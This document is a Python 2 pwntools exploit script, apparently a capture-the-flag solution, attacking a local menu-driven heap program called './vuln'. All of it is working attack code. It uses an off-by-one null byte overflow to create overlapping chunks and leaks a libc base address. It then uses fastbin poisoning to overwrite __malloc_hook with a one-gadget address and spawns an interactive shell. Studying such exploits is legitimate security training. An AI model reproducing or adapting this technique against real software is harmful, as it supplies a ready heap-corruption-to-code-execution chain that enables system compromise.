from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')
 
p = process('./vuln')
 
def create(size, data):
  p.sendlineafter('>', str(1))
  p.sendlineafter('size: ', str(size))
  p.sendlineafter('data: ', data)
 
def delete(idx):
  p.sendlineafter('>', str(2))
  p.sendlineafter('idx: ', str(idx))
 
def printData(idx):
  p.sendlineafter('>', str(3))
  p.sendlineafter('idx: ', str(idx))
  p.recvuntil('data: ')
  ret = p.recvuntil('\n')
  return ret[:-1]

size_a = 0xf8
size_b = 0x68
size_c = 0xf8
create(size_a, 'A'*size_a) # chunk_AAA, idx = 0
create(size_b, 'B'*size_b) # chunk_BBB, idx = 1
create(size_c, 'C'*size_c) # chunk_CCC, idx = 2
create(0x10, 'D'*0x10) # chunk_DDD, idx = 3

delete(1)
delete(0)

size_atob = size_a+8+size_b+8
for sz in range(size_b, size_b-7, -1):
	delete(0)
	create(sz, 'B'*(sz-2) + p32(size_atob)[:2])
delete(2)
create(size_a-2, 'A'*(size_a-2))
 



addr_bin = int(printData(0)[::-1].encode('hex'),16)
offset_bin = 0x3c4b78
libc_base = addr_bin - offset_bin


print 'libc: ' + hex(libc_base)


# restore the size field (0x70) of chunk_BBB
for i in range(0xfd, 0xf7, -1):
  delete(1)
  create(i+1, 'E'*i + '\x70') # chunk_EEE, new_idx = 1


delete(0)
delete(1) #delete chunk_AAA

offset_hook = 0x3c4aed
create(0x108, 'A'*0x100 + p64(offset_hook+libc_base)) # new_idx = 0
for i in range(0xfe, 0xf7, -1):
  delete(0)
  create(i+8, 'F'*i + '\x70\x00') # new_idx = 0


create(0x60, 'B'*0x60)

offset_oneshot = 0xf02a4
oneshot = libc_base + offset_oneshot

create(0x60, 0x13*'G'+p64(oneshot)+'\x00'*(0x68-0x13-8))
create(0x20, 'trigger __malloc_hook')

p.interactive()
